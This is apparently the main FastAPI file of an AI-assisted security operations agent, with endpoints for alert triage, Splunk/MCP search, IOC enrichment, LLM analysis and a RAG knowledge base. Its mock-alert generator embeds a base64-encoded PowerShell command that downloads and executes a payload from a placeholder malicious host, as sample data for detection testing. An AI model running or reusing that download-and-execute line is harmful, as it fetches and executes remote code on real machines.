"""
AI SOC Agent - FastAPI Application
Main entry point for the SOC reasoning agent
"""
import json
from datetime import datetime
from typing import Dict, List, Optional, Any
from contextlib import asynccontextmanager

import httpx
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

from config import config
from correlation import correlation_engine
from prompts import TRIAGE_PROMPT, CORRELATION_PROMPT, SUMMARY_PROMPT
# ai_investigator removed - use comprehensive_analyzer instead
from llm_analyzer import llm_analyzer, analyze_security_event, get_threat_intel

# New imports for enhanced functionality
from mcp_client import splunk_mcp, mcp_executor, test_mcp_connection, search_splunk, get_security_events
from web_enrichment import threat_intel, enrich_ioc, enrich_event_iocs, lookup_ip, lookup_domain, lookup_hash, lookup_url
from enriched_analyzer import enriched_analyzer, analyze_with_enrichment, quick_triage
from alert_monitor import alert_monitor, batch_processor, ioc_enricher, get_monitoring_stats

# Splunk Native MCP and Web Search imports
from splunk_mcp import splunk_mcp_server, ask_splunk_natural, search_splunk_mcp, get_mcp_client_config, test_splunk_mcp
from web_search import web_search, security_researcher, comprehensive_researcher, research_for_event_triage, validate_finding, search_remediation, full_research
from comprehensive_analyzer import comprehensive_analyzer, full_investigation

# RAG Memory Layer
from rag_engine import rag_engine
from knowledge_store import bootstrap_knowledge, seed_mitre_techniques, load_playbooks, ingest_investigations_from_file


def log(message: str, data: Any = None):
    """Debug logger"""
    if config.DEBUG:
        timestamp = datetime.now().isoformat()
        print(f"[{timestamp}] [SOC-AGENT] {message}")
        if data:
            print(f"  Data: {json.dumps(data, indent=2, default=str)}")


# HTTP client for MCP connector
http_client: Optional[httpx.AsyncClient] = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan manager"""
    global http_client
    http_client = httpx.AsyncClient(timeout=60.0)
    log("HTTP client initialized")

    # Bootstrap RAG knowledge base on startup
    try:
        if rag_engine.enabled:
            log("Bootstrapping RAG knowledge base...")
            bootstrap_result = bootstrap_knowledge()
            log("RAG bootstrap complete", rag_engine.get_stats())
    except Exception as e:
        log(f"RAG bootstrap failed (non-fatal): {e}")

    yield
    await http_client.aclose()
    log("HTTP client closed")


# FastAPI app
app = FastAPI(
    title="AI SOC Agent",
    description="Intelligent Security Operations Center Agent",
    version="1.0.0",
    lifespan=lifespan
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# Request/Response Models
class SearchRequest(BaseModel):
    query: str
    earliest_time: str = "-24h"
    latest_time: str = "now"


class TriageRequest(BaseModel):
    alert_name: str
    severity: str = "medium"
    source: str = "unknown"
    event_data: Dict = {}


class CorrelationRequest(BaseModel):
    events: List[Dict]
    rules: Optional[List[str]] = None


class MockAlertRequest(BaseModel):
    alert_type: str = "failed_login_burst"
    count: int = 10


# Endpoints
@app.get("/health")
async def health_check():
    """Health check endpoint"""
    log("Health check requested")
    return {
        "status": "ok",
        "service": "soc-agent",
        "timestamp": datetime.now().isoformat()
    }


@app.get("/api/mcp/status")
async def mcp_status():
    """Check MCP connector status"""
    log("Checking MCP connector status")
    try:
        response = await http_client.get(f"{config.MCP_URL}/health")
        return {
            "mcp_status": "connected",
            "mcp_response": response.json()
        }
    except Exception as e:
        log("MCP connector not reachable", {"error": str(e)})
        return {
            "mcp_status": "disconnected",
            "error": str(e)
        }


@app.get("/api/splunk/test")
async def test_splunk():
    """Test Splunk connectivity through MCP"""
    log("Testing Splunk via MCP")
    try:
        response = await http_client.get(f"{config.MCP_URL}/api/splunk/test")
        result = response.json()
        log("Splunk test result", result)
        return result
    except Exception as e:
        log("Splunk test failed", {"error": str(e)})
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/splunk/search")
async def execute_search(request: SearchRequest):
    """Execute Splunk search through MCP"""
    log("Executing Splunk search", {"query": request.query})
    try:
        response = await http_client.post(
            f"{config.MCP_URL}/api/splunk/search",
            json={
                "query": request.query,
                "earliest_time": request.earliest_time,
                "latest_time": request.latest_time
            }
        )
        result = response.json()
        log("Search result", {"count": result.get("resultCount", 0)})
        return result
    except Exception as e:
        log("Search failed", {"error": str(e)})
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/triage")
async def triage_alert(request: TriageRequest):
    """Perform AI-assisted alert triage"""
    log("Triaging alert", {"alert": request.alert_name})

    # Build triage analysis
    prompt = TRIAGE_PROMPT.format(
        alert_name=request.alert_name,
        severity=request.severity,
        source=request.source,
        timestamp=datetime.now().isoformat(),
        event_data=json.dumps(request.event_data, indent=2)
    )

    # Perform basic automated triage
    triage_result = {
        "alert_name": request.alert_name,
        "original_severity": request.severity,
        "triage_timestamp": datetime.now().isoformat(),
        "automated_analysis": {
            "classification": classify_alert(request.event_data),
            "mitre_mapping": get_mitre_mapping(request.alert_name),
            "recommended_actions": get_recommended_actions(request.severity),
            "confidence_score": calculate_confidence(request.event_data)
        },
        "prompt_for_ai": prompt
    }

    log("Triage complete", triage_result)
    return triage_result


@app.post("/api/correlate")
async def correlate_events(request: CorrelationRequest):
    """Run correlation rules on events"""
    log("Running correlation", {"event_count": len(request.events)})

    if request.rules:
        # Run specific rules
        results = []
        for rule_name in request.rules:
            result = correlation_engine.run_specific_rule(rule_name, request.events)
            results.append(result)
        return {"results": results}
    else:
        # Run all rules
        return correlation_engine.run_all_rules(request.events)


@app.post("/api/mock/generate")
async def generate_mock_alerts(request: MockAlertRequest):
    """Generate mock alerts for testing"""
    log("Generating mock alerts", {"type": request.alert_type, "count": request.count})

    mock_events = []

    if request.alert_type == "failed_login_burst":
        for i in range(request.count):
            mock_events.append({
                "event_type": "authentication_failure",
                "src_ip": "192.168.1.100",
                "dest_ip": "10.0.0.50",
                "user": "admin",
                "timestamp": datetime.now().isoformat(),
                "message": f"Failed login attempt #{i+1}"
            })

    elif request.alert_type == "powershell_encoded":
        mock_events.append({
            "event_type": "process_creation",
            "host": "WORKSTATION01",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
            "user": "jsmith",
            "timestamp": datetime.now().isoformat()
        })

    elif request.alert_type == "process_spawn":
        for i in range(request.count):
            mock_events.append({
                "event_type": "process_creation",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "Image": f"C:\\Windows\\System32\\child_{i}.exe",
                "host": "SERVER01",
                "timestamp": datetime.now().isoformat()
            })

    # Run correlation on mock events
    correlation_result = correlation_engine.run_all_rules(mock_events)

    return {
        "mock_events_generated": len(mock_events),
        "alert_type": request.alert_type,
        "events": mock_events,
        "correlation_result": correlation_result
    }


@app.get("/api/rules")
async def list_rules():
    """List available correlation rules"""
    log("Listing correlation rules")
    return {
        "rules": [
            {
                "name": rule.name,
                "description": rule.description,
                "mitre_id": rule.mitre_id
            }
            for rule in correlation_engine.rules
        ]
    }


@app.get("/api/pipeline/status")
async def pipeline_status():
    """Get full pipeline status"""
    log("Checking full pipeline status")

    status = {
        "soc_agent": "running",
        "mcp_connector": "unknown",
        "splunk": "unknown",
        "timestamp": datetime.now().isoformat()
    }

    # Check MCP
    try:
        mcp_response = await http_client.get(f"{config.MCP_URL}/health")
        status["mcp_connector"] = "running" if mcp_response.status_code == 200 else "error"
    except:
        status["mcp_connector"] = "disconnected"

    # Check Splunk through MCP
    if status["mcp_connector"] == "running":
        try:
            splunk_response = await http_client.get(f"{config.MCP_URL}/api/splunk/test")
            splunk_data = splunk_response.json()
            status["splunk"] = splunk_data.get("status", "unknown")
            status["splunk_version"] = splunk_data.get("splunkVersion", "unknown")
        except:
            status["splunk"] = "error"

    log("Pipeline status", status)
    return status


# ============================================
# Request Models for Investigation
# ============================================

class ThreatIntelRequest(BaseModel):
    indicator: str


# ============================================
# LLM-Powered Analysis Endpoints
# ============================================

class LLMAnalysisRequest(BaseModel):
    event_data: Dict


@app.post("/api/ai/analyze")
async def llm_analyze_event(request: LLMAnalysisRequest):
    """
    Analyze security event using LLM (Claude/OpenAI)
    Requires ANTHROPIC_API_KEY or OPENAI_API_KEY in .env
    """
    log("LLM analysis requested", {"event_type": request.event_data.get("event_type")})

    try:
        analysis = await analyze_security_event(request.event_data)
        return {
            "status": "success",
            "llm_enabled": llm_analyzer.enabled,
            "analysis": analysis
        }
    except Exception as e:
        log(f"LLM analysis error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/ai/threat-intel")
async def llm_threat_intel(request: ThreatIntelRequest):
    """
    Get threat intelligence using LLM
    Requires ANTHROPIC_API_KEY or OPENAI_API_KEY in .env
    """
    log(f"LLM threat intel lookup: {request.indicator}")

    try:
        result = await get_threat_intel(request.indicator)
        return {
            "status": "success",
            "llm_enabled": llm_analyzer.enabled,
            "intel": result
        }
    except Exception as e:
        log(f"LLM threat intel error: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/ai/status")
async def llm_status():
    """Check LLM configuration status"""
    return {
        "llm_enabled": llm_analyzer.enabled,
        "provider": llm_analyzer.provider if llm_analyzer.enabled else None,
        "message": "LLM ready for analysis" if llm_analyzer.enabled else "Set ANTHROPIC_API_KEY or OPENAI_API_KEY in .env to enable AI analysis"
    }


# ============================================
# Splunk Native MCP Endpoints
# ============================================

@app.get("/api/mcp/native/test")
async def test_native_mcp():
    """Test connection to Splunk's native MCP server"""
    log("Testing Splunk native MCP connection")
    try:
        result = await test_mcp_connection()
        return result
    except Exception as e:
        log(f"Native MCP test failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/mcp/search")
async def mcp_search(request: SearchRequest):
    """Execute search via Splunk MCP client"""
    log("MCP search requested", {"query": request.query[:50]})
    try:
        result = await search_splunk(request.query, request.earliest_time, request.latest_time)
        return result
    except Exception as e:
        log(f"MCP search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/mcp/events")
async def get_mcp_events(count: int = 50):
    """Get security events via MCP"""
    log(f"Getting security events (count={count})")
    try:
        events = await get_security_events(count)
        return {"events": events, "count": len(events)}
    except Exception as e:
        log(f"Get events failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


class MCPToolRequest(BaseModel):
    tool_name: str
    parameters: Dict = {}


@app.post("/api/mcp/tool")
async def execute_mcp_tool(request: MCPToolRequest):
    """Execute an MCP tool"""
    log(f"Executing MCP tool: {request.tool_name}")
    try:
        result = await mcp_executor.execute_tool(request.tool_name, request.parameters)
        return result
    except Exception as e:
        log(f"MCP tool execution failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Web-Based Threat Intelligence Endpoints
# ============================================

class IOCRequest(BaseModel):
    indicator: str


class BulkIOCRequest(BaseModel):
    indicators: List[str]


class EventEnrichmentRequest(BaseModel):
    event_data: Dict


@app.post("/api/enrich/ioc")
async def enrich_single_ioc(request: IOCRequest):
    """Enrich a single IOC from web threat intel sources"""
    log(f"Enriching IOC: {request.indicator}")
    try:
        result = await enrich_ioc(request.indicator)
        return result
    except Exception as e:
        log(f"IOC enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/bulk")
async def enrich_bulk_iocs(request: BulkIOCRequest):
    """Enrich multiple IOCs from web threat intel sources"""
    log(f"Bulk enriching {len(request.indicators)} IOCs")
    try:
        results = await ioc_enricher.enrich_indicators(request.indicators)
        return {
            "status": "success",
            "count": len(results),
            "enrichments": results
        }
    except Exception as e:
        log(f"Bulk enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/event")
async def enrich_event(request: EventEnrichmentRequest):
    """Enrich all IOCs found in an event"""
    log("Enriching event IOCs")
    try:
        result = await enrich_event_iocs(request.event_data)
        return result
    except Exception as e:
        log(f"Event enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/ip")
async def enrich_ip_address(request: IOCRequest):
    """Enrich IP address from multiple sources"""
    log(f"IP enrichment: {request.indicator}")
    try:
        result = await lookup_ip(request.indicator)
        return result
    except Exception as e:
        log(f"IP enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/domain")
async def enrich_domain_name(request: IOCRequest):
    """Enrich domain from multiple sources"""
    log(f"Domain enrichment: {request.indicator}")
    try:
        result = await lookup_domain(request.indicator)
        return result
    except Exception as e:
        log(f"Domain enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/hash")
async def enrich_file_hash(request: IOCRequest):
    """Enrich file hash from multiple sources"""
    log(f"Hash enrichment: {request.indicator[:16]}...")
    try:
        result = await lookup_hash(request.indicator)
        return result
    except Exception as e:
        log(f"Hash enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/enrich/url")
async def enrich_url_indicator(request: IOCRequest):
    """Enrich URL from multiple sources"""
    log(f"URL enrichment: {request.indicator[:50]}...")
    try:
        result = await lookup_url(request.indicator)
        return result
    except Exception as e:
        log(f"URL enrichment failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/enrich/status")
async def enrichment_status():
    """Check which enrichment sources are configured"""
    import os
    return {
        "sources": {
            "virustotal": bool(os.getenv("VIRUSTOTAL_API_KEY")),
            "abuseipdb": bool(os.getenv("ABUSEIPDB_API_KEY")),
            "shodan": bool(os.getenv("SHODAN_API_KEY")),
            "greynoise": "community_api",
            "urlhaus": "free_api",
            "alienvault_otx": bool(os.getenv("ALIENVAULT_API_KEY"))
        },
        "message": "Configure API keys in .env to enable more sources"
    }


# ============================================
# Enriched Analysis Endpoints (LLM + Web Intel)
# ============================================

@app.post("/api/analyze/enriched")
async def analyze_with_full_enrichment(request: LLMAnalysisRequest):
    """
    Full analysis pipeline:
    1. Enrich IOCs from web sources (VirusTotal, AbuseIPDB, etc.)
    2. Get historical context from Splunk
    3. Analyze with LLM (Gemini/Claude/OpenAI)
    4. Return comprehensive report
    """
    log("Starting enriched analysis", {"event_type": request.event_data.get("event_type")})
    try:
        result = await analyze_with_enrichment(request.event_data)
        return result
    except Exception as e:
        log(f"Enriched analysis failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/triage/quick")
async def quick_triage_event(request: LLMAnalysisRequest):
    """Quick triage decision with enrichment summary"""
    log("Quick triage requested")
    try:
        result = await quick_triage(request.event_data)
        return result
    except Exception as e:
        log(f"Quick triage failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Alert Monitor Endpoints
# ============================================

@app.post("/api/monitor/start")
async def start_alert_monitor(poll_interval: int = 60):
    """Start the alert monitoring daemon"""
    log(f"Starting alert monitor (poll_interval={poll_interval}s)")
    import asyncio
    # Start monitor in background
    asyncio.create_task(alert_monitor.start())
    return {
        "status": "started",
        "poll_interval": poll_interval,
        "message": "Alert monitor started in background"
    }


@app.post("/api/monitor/stop")
async def stop_alert_monitor():
    """Stop the alert monitoring daemon"""
    log("Stopping alert monitor")
    await alert_monitor.stop()
    return {
        "status": "stopped",
        "stats": get_monitoring_stats()
    }


@app.get("/api/monitor/stats")
async def get_monitor_stats():
    """Get alert monitor statistics"""
    return get_monitoring_stats()


@app.post("/api/monitor/batch")
async def run_batch_processing():
    """Batch process all pending security events"""
    log("Starting batch processing")
    try:
        result = await batch_processor.process_all_pending()
        return result
    except Exception as e:
        log(f"Batch processing failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


class EventFilterRequest(BaseModel):
    event_type: Optional[str] = None
    host: Optional[str] = None
    user: Optional[str] = None
    src_ip: Optional[str] = None


@app.post("/api/monitor/process-filtered")
async def process_filtered_events(request: EventFilterRequest):
    """Process events matching specific criteria"""
    log("Processing filtered events", request.dict())
    try:
        result = await batch_processor.process_specific_events(request.dict())
        return result
    except Exception as e:
        log(f"Filtered processing failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Full Pipeline Status
# ============================================

@app.get("/api/status/full")
async def full_system_status():
    """Get complete system status including all components"""
    log("Getting full system status")
    import os

    status = {
        "timestamp": datetime.now().isoformat(),
        "soc_agent": "running",
        "components": {
            "mcp_connector": "unknown",
            "splunk": "unknown",
            "splunk_mcp_native": "unknown"
        },
        "llm": {
            "enabled": llm_analyzer.enabled,
            "provider": llm_analyzer.provider if llm_analyzer.enabled else None
        },
        "enrichment_sources": {
            "virustotal": bool(os.getenv("VIRUSTOTAL_API_KEY")),
            "abuseipdb": bool(os.getenv("ABUSEIPDB_API_KEY")),
            "shodan": bool(os.getenv("SHODAN_API_KEY")),
            "greynoise": True,  # Community API
            "urlhaus": True     # Free API
        },
        "alert_monitor": get_monitoring_stats(),
        "rag": rag_engine.get_stats()
    }

    # Check MCP connector
    try:
        mcp_response = await http_client.get(f"{config.MCP_URL}/health", timeout=5.0)
        status["components"]["mcp_connector"] = "running" if mcp_response.status_code == 200 else "error"
    except:
        status["components"]["mcp_connector"] = "disconnected"

    # Check Splunk via MCP connector
    if status["components"]["mcp_connector"] == "running":
        try:
            splunk_response = await http_client.get(f"{config.MCP_URL}/api/splunk/test", timeout=10.0)
            splunk_data = splunk_response.json()
            status["components"]["splunk"] = splunk_data.get("status", "unknown")
            status["splunk_version"] = splunk_data.get("splunkVersion", "unknown")
        except:
            status["components"]["splunk"] = "error"

    # Check native Splunk MCP
    try:
        mcp_result = await test_mcp_connection()
        status["components"]["splunk_mcp_native"] = mcp_result.get("status", "unknown")
    except:
        status["components"]["splunk_mcp_native"] = "error"

    return status


# ============================================
# Splunk Native MCP Server Endpoints
# ============================================

@app.get("/api/splunk-mcp/test")
async def test_native_splunk_mcp():
    """Test connection to Splunk's native MCP server"""
    log("Testing Splunk native MCP server")
    try:
        result = await test_splunk_mcp()
        return result
    except Exception as e:
        log(f"Splunk MCP test failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/splunk-mcp/config")
async def get_splunk_mcp_config():
    """Get MCP client configuration for Claude Desktop"""
    return get_mcp_client_config()


class NaturalLanguageQuery(BaseModel):
    question: str


@app.post("/api/splunk-mcp/ask")
async def ask_splunk(request: NaturalLanguageQuery):
    """Ask Splunk a question in natural language"""
    log(f"Natural language query: {request.question[:50]}")
    try:
        result = await ask_splunk_natural(request.question)
        return result
    except Exception as e:
        log(f"Natural language query failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/splunk-mcp/search")
async def search_via_mcp(request: SearchRequest):
    """Execute search via Splunk MCP"""
    log(f"MCP search: {request.query[:50]}")
    try:
        result = await search_splunk_mcp(request.query, request.earliest_time, request.latest_time)
        return result
    except Exception as e:
        log(f"MCP search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Web Search Endpoints
# ============================================

class WebSearchRequest(BaseModel):
    query: str
    num_results: int = 10


class ResearchRequest(BaseModel):
    topic: str
    research_type: str = "general"  # general, threat, ioc, mitre, cve, remediation


class ValidationRequest(BaseModel):
    finding: str
    context: str = ""


@app.post("/api/search/web")
async def general_web_search(request: WebSearchRequest):
    """General web search"""
    log(f"Web search: {request.query[:50]}")
    try:
        result = await web_search.search(request.query, request.num_results)
        return result
    except Exception as e:
        log(f"Web search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/search/threat-intel")
async def search_threat_intelligence(request: WebSearchRequest):
    """Search for threat intelligence"""
    log(f"Threat intel search: {request.query[:50]}")
    try:
        result = await security_researcher.search_threat_intel(request.query)
        return result
    except Exception as e:
        log(f"Threat intel search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/search/remediation")
async def search_for_remediation(request: WebSearchRequest):
    """Search for remediation guidance"""
    log(f"Remediation search: {request.query[:50]}")
    try:
        result = await search_remediation(request.query)
        return result
    except Exception as e:
        log(f"Remediation search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/research/full")
async def comprehensive_research(request: ResearchRequest):
    """Comprehensive research on a topic"""
    log(f"Full research: {request.topic[:50]} (type={request.research_type})")
    try:
        result = await full_research(request.topic, request.research_type)
        return result
    except Exception as e:
        log(f"Full research failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/validate/finding")
async def validate_security_finding(request: ValidationRequest):
    """Validate a security finding with web research"""
    log(f"Validating: {request.finding[:50]}")
    try:
        result = await validate_finding(request.finding, request.context)
        return result
    except Exception as e:
        log(f"Validation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/research/mitre/{technique_id}")
async def research_mitre_technique(technique_id: str):
    """Research MITRE ATT&CK technique"""
    log(f"MITRE research: {technique_id}")
    try:
        result = await security_researcher.research_mitre_technique(technique_id)
        return result
    except Exception as e:
        log(f"MITRE research failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/api/research/cve/{cve_id}")
async def research_cve_vulnerability(cve_id: str):
    """Research CVE vulnerability"""
    log(f"CVE research: {cve_id}")
    try:
        result = await security_researcher.research_cve(cve_id)
        return result
    except Exception as e:
        log(f"CVE research failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# Comprehensive Investigation Endpoint
# ============================================

@app.post("/api/investigate/comprehensive")
async def comprehensive_investigation(request: LLMAnalysisRequest):
    """
    Full investigation pipeline:
    1. Query Splunk MCP for context
    2. Enrich IOCs from threat intel APIs
    3. Research via web search
    4. Analyze with LLM
    5. Validate findings
    6. Return comprehensive report
    """
    log("Starting comprehensive investigation", {"event_type": request.event_data.get("event_type")})
    try:
        result = await full_investigation(request.event_data)
        return result
    except Exception as e:
        log(f"Comprehensive investigation failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============================================
# RAG Memory Layer Endpoints
# ============================================

class FeedbackRequest(BaseModel):
    investigation_id: str
    analyst_verdict: str  # true_positive, false_positive, benign_true_positive
    analyst_notes: str = ""
    original_classification: str = ""
    correct_severity: str = ""


class PlaybookRequest(BaseModel):
    title: str
    content: str
    category: str = "general"


class RAGSearchRequest(BaseModel):
    query: str
    collection: str = "all"  # all, investigations, analyst_feedback, playbooks, mitre_knowledge
    top_k: int = 5


class RAGIngestRequest(BaseModel):
    filepath: str


@app.get("/api/rag/status")
async def rag_status():
    """Get RAG engine status and knowledge base statistics"""
    return rag_engine.get_stats()


@app.post("/api/rag/feedback")
async def submit_feedback(request: FeedbackRequest):
    """
    Submit analyst feedback for a past investigation.
    This feedback is stored in the RAG vector DB and used to improve future investigations.
    If the analyst verdict differs from the AI classification, it is recorded as an override.
    """
    log("Analyst feedback submitted", {
        "investigation_id": request.investigation_id,
        "verdict": request.analyst_verdict
    })
    try:
        result = rag_engine.store_feedback(
            investigation_id=request.investigation_id,
            analyst_verdict=request.analyst_verdict,
            analyst_notes=request.analyst_notes,
            original_classification=request.original_classification,
            correct_severity=request.correct_severity,
        )
        return {"status": "success", **result}
    except Exception as e:
        log(f"Feedback storage failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/search")
async def rag_search(request: RAGSearchRequest):
    """
    Semantic search across the RAG knowledge base.
    Collections: all, investigations, analyst_feedback, playbooks, mitre_knowledge
    """
    log(f"RAG search: {request.query[:50]} (collection={request.collection})")
    try:
        result = rag_engine.search(request.query, request.collection, request.top_k)
        return {"status": "success", **result}
    except Exception as e:
        log(f"RAG search failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/ingest/playbook")
async def ingest_playbook(request: PlaybookRequest):
    """Ingest a SOC playbook into the RAG knowledge base"""
    log(f"Ingesting playbook: {request.title}")
    try:
        result = rag_engine.store_playbook(request.title, request.content, request.category)
        return {"status": "success", **result}
    except Exception as e:
        log(f"Playbook ingestion failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/ingest/investigation")
async def ingest_investigation(request: LLMAnalysisRequest):
    """Manually ingest an investigation report into the RAG knowledge base"""
    log("Manual investigation ingest")
    try:
        result = rag_engine.store_investigation(request.event_data)
        return {"status": "success", **result}
    except Exception as e:
        log(f"Investigation ingestion failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/seed/mitre")
async def seed_mitre():
    """Seed/refresh MITRE ATT&CK techniques in the RAG knowledge base"""
    log("Seeding MITRE techniques")
    try:
        result = seed_mitre_techniques()
        return {"status": "success", **result}
    except Exception as e:
        log(f"MITRE seeding failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/seed/playbooks")
async def seed_playbooks():
    """Load all playbook files from the knowledge/playbooks/ directory"""
    log("Loading playbooks from disk")
    try:
        result = load_playbooks()
        return {"status": "success", **result}
    except Exception as e:
        log(f"Playbook loading failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/rag/bootstrap")
async def rag_bootstrap():
    """Full RAG knowledge base bootstrap (MITRE + playbooks + past investigations)"""
    log("Full RAG bootstrap triggered")
    try:
        result = bootstrap_knowledge()
        return {"status": "success", **result}
    except Exception as e:
        log(f"RAG bootstrap failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# Helper functions
def classify_alert(event_data: Dict) -> str:
    """Classify alert based on event data"""
    if not event_data:
        return "needs_investigation"

    # Simple heuristic classification
    if "malware" in str(event_data).lower():
        return "true_positive_likely"
    if "test" in str(event_data).lower():
        return "false_positive_likely"

    return "needs_investigation"


def get_mitre_mapping(alert_name: str) -> Dict:
    """Get MITRE ATT&CK mapping for alert"""
    mappings = config.MITRE_MAPPINGS
    for rule_name, mapping in mappings.items():
        if rule_name.lower() in alert_name.lower():
            return mapping
    return {"technique": "unknown", "tactic": "unknown", "name": "unknown"}


def get_recommended_actions(severity: str) -> List[str]:
    """Get recommended response actions based on severity"""
    actions = {
        "critical": [
            "Immediately isolate affected system",
            "Notify SOC lead and incident response team",
            "Preserve forensic evidence",
            "Begin incident documentation"
        ],
        "high": [
            "Investigate within 1 hour",
            "Check for lateral movement",
            "Review related alerts",
            "Consider containment actions"
        ],
        "medium": [
            "Investigate within 4 hours",
            "Correlate with other events",
            "Check user/system history"
        ],
        "low": [
            "Investigate within 24 hours",
            "Add to trend analysis"
        ]
    }
    return actions.get(severity.lower(), ["Review and assess"])


def calculate_confidence(event_data: Dict) -> int:
    """Calculate confidence score for triage"""
    base_score = 50

    # Adjust based on data completeness
    if event_data:
        base_score += len(event_data) * 5
        if "src_ip" in event_data:
            base_score += 10
        if "user" in event_data:
            base_score += 10

    return min(95, base_score)


# Main entry point
if __name__ == "__main__":
    import uvicorn
    print("=" * 50)
    print("[*] AI SOC Agent Starting")
    print("=" * 50)
    print(f"[+] Agent Port: {config.AGENT_PORT}")
    print(f"[+] MCP URL: {config.MCP_URL}")
    print(f"[+] Debug: {config.DEBUG}")
    print("=" * 50)

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=config.AGENT_PORT,
        log_level="info" if config.DEBUG else "warning"
    )
